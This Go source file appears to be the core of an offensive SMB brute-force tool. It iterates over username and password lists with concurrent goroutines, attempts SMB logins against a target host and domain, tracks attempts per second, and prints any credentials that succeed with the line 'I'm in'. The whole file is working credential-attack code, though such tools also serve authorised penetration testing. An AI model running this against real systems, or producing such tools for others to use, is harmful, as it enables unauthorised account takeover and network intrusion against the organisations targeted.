package main

import (
	"fmt"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/stacktitan/smb/smb"
)

type Runner struct {
	counter   int
	running   bool
	conf      *Config
	startTime time.Time
}

func NewRunner(conf *Config) Runner {
	var r Runner
	r.conf = conf
	r.running = false
	r.counter = 0
	return r
}

func (r *Runner) Start() {
	r.running = true
	defer r.Stop()
	fmt.Println(BANNER)
	fmt.Println(SEP)
	fmt.Printf(" [*] Number of usernames: %d\n", r.conf.users.Total())
	fmt.Printf(" [*] Number of passwords: %d\n", r.conf.passwds.Total())
	fmt.Printf(" [*] Test cases: %d\n", r.conf.users.Total()*r.conf.passwds.Total())
	fmt.Printf(" [*] Number of threads: %d\n", r.conf.threads)
	fmt.Println(SEP)

	var wg sync.WaitGroup
	wg.Add(1)
	go r.runProgress(&wg)

	limiter := make(chan bool, r.conf.threads)
	for r.conf.passwds.Next() {
		nextPassword := r.conf.passwds.Value()
		for r.conf.users.Next() {
			limiter <- true
			nextUser := r.conf.users.Value()
			wg.Add(1)
			r.counter++
			go func() {
				// release a slot in queue when exiting
				defer func() { <-limiter }()
				defer wg.Done()
				r.RunTask(nextUser, nextPassword)
				if r.conf.sleep > 0 {
					time.Sleep(time.Duration(r.conf.sleep*1000) * time.Millisecond)
				}
			}()
		}
		// Reset the pwd inputlist position
		r.conf.users.position = -1
	}
	wg.Wait()
}

func (r *Runner) runProgress(wg *sync.WaitGroup) {
	defer wg.Done()
	r.startTime = time.Now()
	totalProgress := r.conf.users.Total() * r.conf.passwds.Total()
	for r.counter <= totalProgress {
		r.updateProgress()
		if r.counter == totalProgress {
			return
		}
		time.Sleep(time.Millisecond * 100)
	}
}

func (r *Runner) updateProgress() {
	//TODO: refactor to use a defined progress struct for future output modules
	runningSecs := int((time.Now().Sub(r.startTime)) / time.Second)
	var reqRate int
	if runningSecs > 0 {
		reqRate = int(r.counter / runningSecs)
	} else {
		reqRate = 0
	}
	dur := time.Now().Sub(r.startTime)
	hours := dur / time.Hour
	dur -= hours * time.Hour
	mins := dur / time.Minute
	dur -= mins * time.Minute
	secs := dur / time.Second
	totalProgress := r.conf.users.Total() * r.conf.passwds.Total()
	progString := fmt.Sprintf(":: Progress: [%d/%d] :: %d tries/sec :: Duration: [%d:%02d:%02d] ::", r.counter, totalProgress, int(reqRate), hours, mins, secs)
	fmt.Fprintf(os.Stderr, "%s%s", TERMINAL_CLEAR_LINE, progString)
}

func (r *Runner) RunTask(username []byte, password []byte) {
	options := smb.Options{
		Host:     r.conf.host,
		Port:     r.conf.port,
		User:     string(username),
		Password: string(password),
		Domain:   r.conf.domain,
	}
	session, err := smb.NewSession(options, r.conf.debug)
	if err != nil {
		errstr := fmt.Sprintf("%s", err)
		if !strings.Contains(errstr, "Logon failed") {
			fmt.Printf("%s [!] Error: %s\n", TERMINAL_CLEAR_LINE, err)
		}
		return
	}
	defer session.Close()

	if session.IsAuthenticated {
		fmt.Printf("%s [*] In hacker voice *I'm in* // Username: %s // Password: %s\n", TERMINAL_CLEAR_LINE, username, password)
	}
}

func (r *Runner) Stop() {
	fmt.Printf("\n")
	r.running = false
}
